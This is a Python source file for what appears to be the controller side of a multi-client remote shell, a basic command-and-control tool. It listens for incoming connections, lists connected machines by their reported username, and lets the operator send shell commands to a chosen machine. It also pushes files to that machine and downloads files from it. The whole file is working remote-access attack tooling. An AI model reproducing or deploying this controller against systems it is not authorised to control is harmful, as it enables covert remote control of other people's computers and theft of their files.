import socket
import sys
import time
import os
from queue import Queue
import threading

HEADER = 50
HOST = '127.0.0.1'
PORT = 5764
q = Queue()
connections = []
address = []


def start_connections():
    global s
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    s.bind((HOST,PORT))
    s.listen(15)
    conn,addr = s.accept()
    if conn != None:
        connections.append(conn)
        address.append(addr)
    print(f'\nConnection Sucssesfully Established at {addr[0]}:{addr[1]}')


def recieve_output(conn,command):
    try:
        cmd_head=f'{len(command):<50}'
        conn.send((cmd_head+command).encode('utf-8'))
        msg = conn.recv(20469096)
        msg  = str(msg.decode('utf-8'))
        print(msg,end='')
    except :
        print("Invalid Connection was Lost...")


def create_workers():
    for _ in range(2):
        t = threading.Thread(target=work)
        t.deamon = True
        t.start()

def work():
    while True:
        stat = q.get()
        if stat == 1:
            start_connections()
        elif stat == 2:
            main()
    q.task_done()

def create_jobs():
    for i in range(1,3):
        q.put(i)
    q.join()


def list_connections():
    print("==================== Conections ====================")
    print("id  username           ip address")
    for i,conn in enumerate(connections):
        try:
            data = 'name'
            full_data = f'{len(data):<50}'
            data = full_data + data
            conn.send(str.encode(data))
            name = str(conn.recv(1024),'utf-8')
        except :
            del connections[i]
            del address[i]
            continue
        print(f'{i} {name} {address[i][0]}:{address[i][1]}')



def main():
    while True:
        cmd = input('RemoteShell >')
        if cmd == '':
            continue
        elif cmd.lower() == 'list':
            list_connections()
        elif cmd.lower().startswith('select'):
            try:
                ids = cmd.replace('select ','')
                ids = int(ids)
                conn = connections[ids]
                print(f'Sucessfully Connetected to {address[ids][0]}:{address[ids][1]}')
                send_commands(conn)
            except :
                print("Lost Connection or invalid Id.")
                continue
        elif cmd.lower() == 'quit':
            sys.exit()
        else:
            print('Error Command not recognized.')


def send_commands(conn):
    while True:
        try:
            cmd = input()
            cmd_head=f'{len(cmd):<50}'
            if cmd == '':
                continue

            if cmd.lower().startswith('send'):
                try:
                    paths = cmd[5:]
                    local_path = paths.split('>')[0].strip()
                    file_size = str(os.path.getsize(local_path))
                    size_head = f'{len(file_size):<50}'
                    conn.send(cmd_head.encode('utf-8')+cmd.encode('utf-8'))
                    time.sleep(2)
                    conn.send(size_head.encode('utf-8')+file_size.encode('utf-8'))
                    file = open(local_path,'rb')
                    chunk = file.read(1024)
                    while chunk:
                        conn.send(chunk)
                        chunk = file.read(1024)
                    print("Completed!!!")
                except FileNotFoundError:
                    print("Error: File Path Not Found!!!")
            elif cmd.lower().startswith('download'):
                try:
                    conn.send((cmd_head+cmd).encode('utf-8'))
                    head = conn.recv(HEADER)
                    file_length = int(head.decode('utf-8').strip())
                    size = int(conn.recv(file_length).decode('utf-8'))
                    file_name = cmd.replace('download ','').strip()
                    file = open(file_name,'wb')
                    count = 0
                    while count < size:
                        chunk = conn.recv(1024)
                        file.write(chunk)
                        count += len(chunk)
                    file.close()
                    print("Completed!!!")
                except Exception as e:
                    print(e)
            elif cmd.lower() != 'quit':
                recieve_output(conn,cmd)
            else:
                break
        except :
            print("Error Connection Lost.")

if __name__ == "__main__":
    create_workers()
    create_jobs()
